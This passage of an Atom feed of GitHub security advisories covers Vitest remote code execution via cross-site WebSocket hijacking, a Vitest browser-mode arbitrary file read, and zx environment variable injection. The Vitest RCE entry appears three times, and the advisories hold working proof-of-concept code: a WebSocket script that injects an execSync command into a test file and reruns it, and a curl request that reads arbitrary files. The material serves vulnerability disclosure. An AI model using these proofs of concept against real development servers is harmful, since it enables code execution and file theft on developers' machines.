<li><a href="https://vitest.dev/config/#api">https://vitest.dev/config/#api</a></li>
<li><a href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/advisories/GHSA-9crc-q9x8-hgqq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-04T17:00:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vitest] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening]]></title>
        <id>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</id>
        <link href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq"/>
        <updated>2025-02-04T22:04:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>
<h3 id="details">Details</h3>
<p>When <a href="https://vitest.dev/config/#api"><code>api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.
<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></p>
<p>This WebSocket server has <code>saveTestFile</code> API that can edit a test file and <code>rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code>saveTestFile</code> API and then running that file by calling the <code>rerun</code> API.
<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Open Vitest UI.</li>
<li>Access a malicious web site with the script below.</li>
<li>If you have <code>calc</code> executable in <code>PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>
</ol>
<pre><code class="language-js">// code from https://github.com/WebReflection/flatted
const Flatted=function(n){"use strict";function t(n){return t="function"==typeof Symbol&amp;&amp;"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;"function"==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?"symbol":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f="string",i={},c="object",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({"":i},"",i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return""===n||-1&lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({"":n},"",n)),v=!y;y&lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return"["+s.join(",")+"]";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});

// actual code to run
const ws = new WebSocket('ws://localhost:51204/__vitest_api__')
ws.addEventListener('message', e =&gt; {
    console.log(e.data)
})
ws.addEventListener('open', () =&gt; {
    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: "getFiles", a: [] }))

    const testFilePath = "/path/to/test-file/basic.test.ts" // use a test file returned from the response of "getFiles"

    // edit file content to inject command execution
    ws.send(Flatted.stringify({
      t: 'q',
      i: crypto.randomUUID(),
      m: "saveTestFile",
      a: [testFilePath, "import child_process from 'child_process';child_process.execSync('calc')"]
    }))
    // rerun the tests to run the injected command execution code
    ws.send(Flatted.stringify({
      t: 'q',
      i: crypto.randomUUID(),
      m: "rerun",
      a: [testFilePath]
    }))
})
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in remote code execution for users that are using Vitest serve API.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24964">https://nvd.nist.gov/vuln/detail/CVE-2025-24964</a></li>
<li><a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></li>
<li><a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></li>
<li><a href="https://vitest.dev/config/#api">https://vitest.dev/config/#api</a></li>
<li><a href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/advisories/GHSA-9crc-q9x8-hgqq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-04T17:00:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vitest] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening]]></title>
        <id>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</id>
        <link href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq"/>
        <updated>2025-02-04T22:04:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>
<h3 id="details">Details</h3>
<p>When <a href="https://vitest.dev/config/#api"><code>api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.
<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></p>
<p>This WebSocket server has <code>saveTestFile</code> API that can edit a test file and <code>rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code>saveTestFile</code> API and then running that file by calling the <code>rerun</code> API.
<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Open Vitest UI.</li>
<li>Access a malicious web site with the script below.</li>
<li>If you have <code>calc</code> executable in <code>PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>
</ol>
<pre><code class="language-js">// code from https://github.com/WebReflection/flatted
const Flatted=function(n){"use strict";function t(n){return t="function"==typeof Symbol&amp;&amp;"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;"function"==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?"symbol":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f="string",i={},c="object",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({"":i},"",i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return""===n||-1&lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({"":n},"",n)),v=!y;y&lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return"["+s.join(",")+"]";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});

// actual code to run
const ws = new WebSocket('ws://localhost:51204/__vitest_api__')
ws.addEventListener('message', e =&gt; {
    console.log(e.data)
})
ws.addEventListener('open', () =&gt; {
    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: "getFiles", a: [] }))

    const testFilePath = "/path/to/test-file/basic.test.ts" // use a test file returned from the response of "getFiles"

    // edit file content to inject command execution
    ws.send(Flatted.stringify({
      t: 'q',
      i: crypto.randomUUID(),
      m: "saveTestFile",
      a: [testFilePath, "import child_process from 'child_process';child_process.execSync('calc')"]
    }))
    // rerun the tests to run the injected command execution code
    ws.send(Flatted.stringify({
      t: 'q',
      i: crypto.randomUUID(),
      m: "rerun",
      a: [testFilePath]
    }))
})
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in remote code execution for users that are using Vitest serve API.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24964">https://nvd.nist.gov/vuln/detail/CVE-2025-24964</a></li>
<li><a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></li>
<li><a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></li>
<li><a href="https://vitest.dev/config/#api">https://vitest.dev/config/#api</a></li>
<li><a href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/advisories/GHSA-9crc-q9x8-hgqq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-04T17:00:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vitest] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening]]></title>
        <id>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</id>
        <link href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq"/>
        <updated>2025-02-04T22:04:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>
<h3 id="details">Details</h3>
<p>When <a href="https://vitest.dev/config/#api"><code>api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.
<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></p>
<p>This WebSocket server has <code>saveTestFile</code> API that can edit a test file and <code>rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code>saveTestFile</code> API and then running that file by calling the <code>rerun</code> API.
<a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Open Vitest UI.</li>
<li>Access a malicious web site with the script below.</li>
<li>If you have <code>calc</code> executable in <code>PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>
</ol>
<pre><code class="language-js">// code from https://github.com/WebReflection/flatted
const Flatted=function(n){"use strict";function t(n){return t="function"==typeof Symbol&amp;&amp;"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;"function"==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?"symbol":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f="string",i={},c="object",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({"":i},"",i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return""===n||-1&lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({"":n},"",n)),v=!y;y&lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return"["+s.join(",")+"]";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});

// actual code to run
const ws = new WebSocket('ws://localhost:51204/__vitest_api__')
ws.addEventListener('message', e =&gt; {
    console.log(e.data)
})
ws.addEventListener('open', () =&gt; {
    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: "getFiles", a: [] }))

    const testFilePath = "/path/to/test-file/basic.test.ts" // use a test file returned from the response of "getFiles"

    // edit file content to inject command execution
    ws.send(Flatted.stringify({
      t: 'q',
      i: crypto.randomUUID(),
      m: "saveTestFile",
      a: [testFilePath, "import child_process from 'child_process';child_process.execSync('calc')"]
    }))
    // rerun the tests to run the injected command execution code
    ws.send(Flatted.stringify({
      t: 'q',
      i: crypto.randomUUID(),
      m: "rerun",
      a: [testFilePath]
    }))
})
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in remote code execution for users that are using Vitest serve API.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24964">https://nvd.nist.gov/vuln/detail/CVE-2025-24964</a></li>
<li><a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></li>
<li><a href="https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></li>
<li><a href="https://vitest.dev/config/#api">https://vitest.dev/config/#api</a></li>
<li><a href="https://github.com/advisories/GHSA-9crc-q9x8-hgqq">https://github.com/advisories/GHSA-9crc-q9x8-hgqq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9crc-q9x8-hgqq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-04T17:00:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@vitest/browser] Vitest browser mode serves arbitrary files]]></title>
        <id>https://github.com/advisories/GHSA-8gvc-j273-4wm5</id>
        <link href="https://github.com/advisories/GHSA-8gvc-j273-4wm5"/>
        <updated>2025-02-04T22:03:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>__screenshot-error</code> handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by <a href="https://vitest.dev/guide/browser/config.html#browser-api"><code>browser.api.host: true</code></a>, an attacker can send a request to that handler from remote to get the content of arbitrary files.</p>
<h3 id="details">Details</h3>
<p>This <code>__screenshot-error</code> handler on the browser mode HTTP server responds any file on the file system.
<a href="https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130">https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130</a></p>
<p>This code was added by <a href="https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f">https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f</a>.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Create a directory and change the current directory to that directory</li>
<li>Run <code>npx vitest init browser</code></li>
<li>Run <code>npm run test:browser</code></li>
<li>Run <code>curl http://localhost:63315/__screenshot-error?file=/path/to/any/file</code></li>
</ol>
<h3 id="impact">Impact</h3>
<p>Users explicitly exposing the browser mode server to the network by <a href="https://vitest.dev/guide/browser/config.html#browser-api"><code>browser.api.host: true</code></a> may get any files exposed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5">https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f">https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/ed9aeba212df04b83ed01810780663ff2cdd0adf">https://github.com/vitest-dev/vitest/commit/ed9aeba212df04b83ed01810780663ff2cdd0adf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24963">https://nvd.nist.gov/vuln/detail/CVE-2025-24963</a></li>
<li><a href="https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130">https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130</a></li>
<li><a href="https://vitest.dev/guide/browser/config.html#browser-api">https://vitest.dev/guide/browser/config.html#browser-api</a></li>
<li><a href="https://github.com/advisories/GHSA-8gvc-j273-4wm5">https://github.com/advisories/GHSA-8gvc-j273-4wm5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8gvc-j273-4wm5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-04T16:51:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@vitest/browser] Vitest browser mode serves arbitrary files]]></title>
        <id>https://github.com/advisories/GHSA-8gvc-j273-4wm5</id>
        <link href="https://github.com/advisories/GHSA-8gvc-j273-4wm5"/>
        <updated>2025-02-04T22:03:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>__screenshot-error</code> handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by <a href="https://vitest.dev/guide/browser/config.html#browser-api"><code>browser.api.host: true</code></a>, an attacker can send a request to that handler from remote to get the content of arbitrary files.</p>
<h3 id="details">Details</h3>
<p>This <code>__screenshot-error</code> handler on the browser mode HTTP server responds any file on the file system.
<a href="https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130">https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130</a></p>
<p>This code was added by <a href="https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f">https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f</a>.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Create a directory and change the current directory to that directory</li>
<li>Run <code>npx vitest init browser</code></li>
<li>Run <code>npm run test:browser</code></li>
<li>Run <code>curl http://localhost:63315/__screenshot-error?file=/path/to/any/file</code></li>
</ol>
<h3 id="impact">Impact</h3>
<p>Users explicitly exposing the browser mode server to the network by <a href="https://vitest.dev/guide/browser/config.html#browser-api"><code>browser.api.host: true</code></a> may get any files exposed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5">https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f">https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f</a></li>
<li><a href="https://github.com/vitest-dev/vitest/commit/ed9aeba212df04b83ed01810780663ff2cdd0adf">https://github.com/vitest-dev/vitest/commit/ed9aeba212df04b83ed01810780663ff2cdd0adf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24963">https://nvd.nist.gov/vuln/detail/CVE-2025-24963</a></li>
<li><a href="https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130">https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130</a></li>
<li><a href="https://vitest.dev/guide/browser/config.html#browser-api">https://vitest.dev/guide/browser/config.html#browser-api</a></li>
<li><a href="https://github.com/advisories/GHSA-8gvc-j273-4wm5">https://github.com/advisories/GHSA-8gvc-j273-4wm5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8gvc-j273-4wm5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-04T16:51:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zx] ZX Allows Environment Variable Injection for dotenv API]]></title>
        <id>https://github.com/advisories/GHSA-qwp8-x4ff-5h87</id>
        <link href="https://github.com/advisories/GHSA-qwp8-x4ff-5h87"/>
        <updated>2025-02-04T17:29:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability is an <strong>Environment Variable Injection</strong> issue in <code>dotenv.stringify</code>, affecting <code>google/zx</code>  version <strong>8.3.1</strong>.</p>
<p>An attacker with control over environment variable values can inject unintended environment variables into <code>process.env</code>. This can lead to <strong>arbitrary command execution</strong> or <strong>unexpected behavior</strong> in applications that rely on environment variables for security-sensitive operations. Applications that process untrusted input and pass it through <code>dotenv.stringify</code> are particularly vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been <strong>patched</strong> in version <strong>8.3.2</strong>. Users should <strong>immediately upgrade</strong> to this version to mitigate the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not feasible, users can mitigate the vulnerability by <strong>sanitizing user-controlled environment variable values</strong> before passing them to <code>dotenv.stringify</code>. Specifically, avoid using <code>"</code>, <code>'</code>, and backticks in values, or enforce strict validation of environment variables before usage.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/google/zx/issues/">Issue Report</a></li>
<li><a href="https://github.com/google/zx/security/policy">Security Policy</a></li>
<li><a href="https://g.co/vulnz">Google Vulnerability Disclosure</a></li>
<li><a href="https://github.com/google/zx/pull/1094">Patch</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/google/zx/security/advisories/GHSA-qwp8-x4ff-5h87">https://github.com/google/zx/security/advisories/GHSA-qwp8-x4ff-5h87</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24959">https://nvd.nist.gov/vuln/detail/CVE-2025-24959</a></li>
<li><a href="https://github.com/google/zx/pull/1094">https://github.com/google/zx/pull/1094</a></li>
<li><a href="https://github.com/google/zx/commit/5ba714d14ecf0555a74d4db96622840ac19839c5">https://github.com/google/zx/commit/5ba714d14ecf0555a74d4db96622840ac19839c5</a></li>
<li><a href="https://github.com/webpod/envapi/blob/v0.2.1/src/main/ts/envapi.ts#L74-L77">https://github.com/webpod/envapi/blob/v0.2.1/src/main/ts/envapi.ts#L74-L77</a></li>
<li><a href="https://github.com/advisories/GHSA-qwp8-x4ff-5h87">https://github.com/advisories/GHSA-qwp8-x4ff-5h87</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qwp8-x4ff-5h87</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-03T22:34:08.000Z</published>
    </entry>
</feed>